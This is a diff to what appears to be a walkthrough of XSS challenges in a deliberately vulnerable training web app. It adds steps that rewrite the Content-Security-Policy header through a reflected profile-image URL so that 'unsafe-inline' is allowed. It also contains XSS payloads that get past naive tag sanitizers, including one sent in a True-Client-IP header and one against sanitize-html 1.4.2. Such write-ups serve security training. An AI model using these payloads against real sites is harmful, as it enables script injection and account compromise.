@@ -109,13 +109,32 @@ Create a new account with the malicious payload as the user's email. The applica
 ```
 Note that the inside quotes are escaped.
 ## 13. CSP Bypass
-This challenge can be split into two main parts: loading the malicious payload into the DOM (Document Object Model) and bypassing the CSP to allow the payload to be executed. Login as any user and navigate to the user profile page. Try loading the malicious payload into the username field. Observe that the `<script>` command is removed, followed by one letter, leaving only `lert(`xss`)</script>`. This tells us that the sanitizer can identify and remove exact html tags. However, a cleverly crafted entry can bypass this naive policy. There are a few ways to do this, here are two of them:
+This challenge can be split into two main parts: loading the malicious payload into the DOM (Document Object Model) and then bypassing the CSP to allow the payload to be executed. Login as any user and navigate to the user profile page. Try loading the malicious payload into the username field. Observe that the `<script>` command is removed, followed by one letter, leaving only `lert(`xss`)</script>`. This tells us that the sanitizer can identify and remove exact html tags. However, a cleverly crafted entry can bypass this naive policy. There are a few ways to do this, here are two of them:
 ```
 `<<script>ascript>alert(`xss`)</script>
 <<a|ascript>alert(`xss`)</script>
 ```
 In each case, the sanitizer removes what it _thinks_ to be the html tag, followed by the next character after it. In the first example that would be `<script>a` and in the second example it is `<a|a`. 
-Next, we need to bypass the CSP (change it to allow inline Javascript) so the payload can be executed. Open the Network tab of the developer settings. Set your profile picture using a valid image URL and then inspect the network activity. You should see in the `profile` 
+Next, we need to bypass the CSP (change it to allow inline Javascript) so the payload can be executed. Open the Network tab of the developer settings. Set your profile picture using a valid image URL and then inspect the network activity. You should see in the `profile` header that the image url is reflected as part of the CSP:
+```
+content-security-policy:
+img-src 'self' /assets/public/images/uploads/22.jpg; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
+```
+Now, try putting an invalid url into the profile picture url field -- the url must still be of an image file type, like `https://does-not-exist.jpg`. Notice that this link is still reflected in the CSP, even though it cannot set the profile picture. Therefore, we can set the url to be any image url, even one that doesn't exist. Set it to be:
+```
+https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
+```
+Now, the whole CSP header should read:
+```
+content-security-policy:
+img-src 'self' https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
+```
+The browser will only interpret the first rule (up until the `;`)
+```
+content-security-policy:
+img-src 'self' https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com;
+```
+The original policy rules have been overwritten by the malicious ones. Specifically, the addition of `'unsafe-inline'` tells the browser to run any inline code that exists in the DOM. Reload the page to complete the challenge.
 ## 14. HTTP-Header XSS
 The vulnerable page is the Last Login page. We will load the malicious payload into the Last Login IP field. First, ensure that you are logged in, then logout. Search for the `/rest/saveLoginIp` url in the network traffic. This is how the application saves the last login IP address for the next time that you login. Unfortunately, the IP address header isn't shown in the request. Figuring it out is arbitrary. Add this header to the request and then resend it:
 ```
@@ -123,7 +142,7 @@ True-Client-IP: <iframe src="javascript:alert(`xss`)">
 ```
 Login again to complete the challenge.
 ## 15. Server-Side XSS Protection
-Post a comment that bypasses a vulnerability in the library sanitize-html version 1.4.2 (as found in package.json.bak). In particular, this version does not recursively cleanse the input. Therefore, some clever nesting of tags can bypass the library:
+Post a comment that bypasses a vulnerability in the library [sanitize-html version 1.4.2](https://security.snyk.io/package/npm/sanitize-html/1.4.2) (as found in package.json.bak). In particular, this version does not recursively cleanse the input. Therefore, some clever nesting of tags can bypass the library:
 ```
 <<love this juice>iframe src="javascript:alert(`xss`)">
 ```
